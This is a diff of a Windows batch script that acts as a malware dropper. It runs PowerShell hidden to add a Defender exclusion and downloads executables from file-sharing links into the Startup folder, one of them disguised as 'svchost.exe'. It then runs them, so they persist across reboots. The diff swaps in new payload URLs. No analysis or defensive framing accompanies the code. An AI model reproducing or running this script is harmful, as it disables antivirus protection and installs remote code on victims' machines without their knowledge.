@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1231360800401395712/Update.exe?ex=6636ad1c&is=6624381c&hm=3e55371cf46dbf54bb5aa653f148b1c55184f46eeb4a17ee768c821283bd7c42&"
+set "URL=https://link.storjshare.io/s/jvgodndum3cnmdzwofmqcuyyd3oq/alboorgi/python-3.11.0-amd64.exe?download=1"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -20,8 +20,8 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1231360800401395712/Update.exe?ex=6636ad1c&is=6624381c&hm=3e55371cf46dbf54bb5aa653f148b1c55184f46eeb4a17ee768c821283bd7c42&"
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+set "URL=https://link.storjshare.io/s/jupizfqdjs75vrcxlx7blaybowka/isimsallaqwe/svchost.exe?download=1"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
 
 
 if exist "%DEST%" del "%DEST%"
